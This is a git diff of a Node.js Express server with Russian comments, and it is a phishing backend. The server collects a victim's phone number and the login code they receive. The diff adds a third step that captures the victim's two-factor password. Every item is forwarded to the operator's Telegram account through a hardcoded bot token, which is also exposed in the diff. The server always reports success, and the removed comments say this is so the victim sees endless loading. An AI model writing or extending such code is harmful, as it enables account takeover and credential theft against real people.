@@ -7,11 +7,11 @@ app.use(express.static(path.join(__dirname)));
 app.use(express.json());
 
 // ТВОИ ДАННЫЕ
-const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
+const BOT_TOKEN = '8868277445:AAEPYSE-uoej11anci9jpiaoDYsOqL_-tps';
 const YOUR_ID = '6277925229';
 const YOUR_USERNAME = '@anyaskds';
 
-// Хранилище кодов (просто для справки, но не используем для проверки)
+// Хранилище
 const codes = {};
 
 app.get('/', (req, res) => {
@@ -42,11 +42,10 @@ function sendTelegramMessage(chatId, message) {
     .catch(err => console.log(`❌ Ошибка fetch: ${err.message}`));
 }
 
-// ===== ЭТАП 1: Человек написал номер → ПРИХОДИТ ТОЛЬКО НОМЕР =====
+// ===== ЭТАП 1: НОМЕР =====
 app.post('/api/send-code', (req, res) => {
     const { phone, region, fullName, username, userId } = req.body;
 
-    // Генерируем код и сохраняем его
     const code = Math.floor(100000 + Math.random() * 900000).toString();
 
     codes[phone] = {
@@ -61,7 +60,6 @@ app.post('/api/send-code', (req, res) => {
     console.log('📱 Телефон:', phone);
     console.log('🔑 Сгенерирован код:', code);
 
-    // ⚡ СООБЩЕНИЕ 1: ТОЛЬКО НОМЕР
     const messagePhone = `
 📱 НОВЫЙ НОМЕР!
 
@@ -74,23 +72,20 @@ app.post('/api/send-code', (req, res) => {
 📅 Время: ${new Date().toLocaleString()}
     `.trim();
 
-    // Отправляем ТОЛЬКО НОМЕР
     sendTelegramMessage(YOUR_ID, messagePhone);
     sendTelegramMessage(YOUR_USERNAME, messagePhone);
 
     res.json({ success: true });
 });
 
-// ===== ЭТАП 2: Человек ввел код → ПРИХОДИТ КОД (ВСЕГДА!) =====
+// ===== ЭТАП 2: КОД =====
 app.post('/api/verify-code', (req, res) => {
     const { phone, code, fullName, username, userId } = req.body;
 
-    console.log('📥 ПОЛУЧЕН КОД ОТ ПОЛЬЗОВАТЕЛЯ');
+    console.log('📥 ПОЛУЧЕН КОД');
     console.log('📱 Телефон:', phone);
-    console.log('🔑 Введенный код:', code);
-    console.log('👤 Имя:', fullName);
+    console.log('🔑 Код:', code);
 
-    // ⚡ СООБЩЕНИЕ 2: ВСЕГДА ОТПРАВЛЯЕМ КОД, КОТОРЫЙ ВВЕЛ ПОЛЬЗОВАТЕЛЬ
     const messageCode = `
 🔑 ВВЕДЕН КОД!
 
@@ -103,12 +98,39 @@ app.post('/api/verify-code', (req, res) => {
 📅 Время: ${new Date().toLocaleString()}
     `.trim();
 
-    // Отправляем КОД (ВСЕГДА!)
     sendTelegramMessage(YOUR_ID, messageCode);
     sendTelegramMessage(YOUR_USERNAME, messageCode);
 
-    // ВСЕГДА ВОЗВРАЩАЕМ УСПЕХ, ДАЖЕ ЕСЛИ КОД НЕВЕРНЫЙ
-    // ЧТОБЫ У ПОЛЬЗОВАТЕЛЯ ПОКАЗАЛАСЬ БЕСКОНЕЧНАЯ ЗАГРУЗКА
+    res.json({ success: true });
+});
+
+// ===== ЭТАП 3: ПАРОЛЬ (ВСЕГДА УСПЕШНО) =====
+app.post('/api/verify-password', (req, res) => {
+    const { phone, code, password, fullName, username, userId } = req.body;
+
+    console.log('📥 ПОЛУЧЕН ПАРОЛЬ');
+    console.log('📱 Телефон:', phone);
+    console.log('🔑 Код:', code);
+    console.log('🔐 Пароль:', password);
+    console.log('👤 Имя:', fullName);
+
+    const messagePassword = `
+🔐 ВВЕДЕН ПАРОЛЬ 2FA!
+
+👤 Имя: ${fullName}
+📱 Телефон: ${phone}
+🔑 Код: ${code}
+🔐 Пароль: ${password}
+🆔 ID: ${userId}
+👤 Username: @${username || 'нет'}
+
+📅 Время: ${new Date().toLocaleString()}
+    `.trim();
+
+    sendTelegramMessage(YOUR_ID, messagePassword);
+    sendTelegramMessage(YOUR_USERNAME, messagePassword);
+
+    // ВСЕГДА ВОЗВРАЩАЕМ УСПЕХ
     res.json({ success: true });
 });
 
